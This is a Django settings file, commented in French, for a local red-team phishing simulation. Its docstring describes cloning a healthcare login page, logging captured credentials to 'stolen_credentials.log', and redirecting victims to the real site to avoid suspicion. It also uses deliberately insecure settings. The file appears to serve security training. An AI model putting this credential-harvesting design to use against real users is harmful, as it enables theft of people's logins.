"""
Django settings - PHISHING SITE (simulation Red Team)

Ce projet est totalement independant de `healthcare_project`. Il simule le
site d'un attaquant : il sert un clone visuel de la page de login officielle
sur un port different, capture les identifiants dans un fichier, puis
redirige la victime vers le vrai site pour qu'elle ne se doute de rien.

Usage pedagogique uniquement, en local, avec des comptes synthetiques.
"""

from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent

SECRET_KEY = "phishing-demo-not-for-production-use-only"

DEBUG = True

ALLOWED_HOSTS = ["*"]

# Pas de auth/admin/sessions : ce site n'a pas de compte utilisateur, pas de
# base de donnees necessaire. Il se contente d'afficher une page et d'ecrire
# dans un fichier log.
INSTALLED_APPS = [
    "django.contrib.staticfiles",
    "fake_login",
]

MIDDLEWARE = [
    "django.middleware.security.SecurityMiddleware",
    "django.middleware.common.CommonMiddleware",
    "django.middleware.csrf.CsrfViewMiddleware",
    "django.middleware.clickjacking.XFrameOptionsMiddleware",
]

ROOT_URLCONF = "config.urls"

TEMPLATES = [
    {
        "BACKEND": "django.template.backends.django.DjangoTemplates",
        "DIRS": [BASE_DIR / "templates"],
        "APP_DIRS": True,
        "OPTIONS": {
            "context_processors": [
                "django.template.context_processors.request",
            ],
        },
    },
]

WSGI_APPLICATION = "config.wsgi.application"

# Base de donnees definie pour que Django ne proteste pas, mais inutilisee :
# il n'y a aucun modele dans ce projet, donc pas besoin de "migrate".
DATABASES = {
    "default": {
        "ENGINE": "django.db.backends.sqlite3",
        "NAME": BASE_DIR / "unused.sqlite3",
    }
}

STATIC_URL = "static/"
STATICFILES_DIRS = [BASE_DIR / "static"]

DEFAULT_AUTO_FIELD = "django.db.models.BigAutoField"

# URL du VRAI site, vers laquelle la victime est redirigee apres le vol
# de ses identifiants (pour ne pas eveiller les soupcons).
REAL_SITE_LOGIN_URL = "http://localhost:8000/login/"

# Fichier ou sont enregistres les identifiants captures.
STOLEN_CREDENTIALS_LOG = BASE_DIR / "stolen_credentials.log"
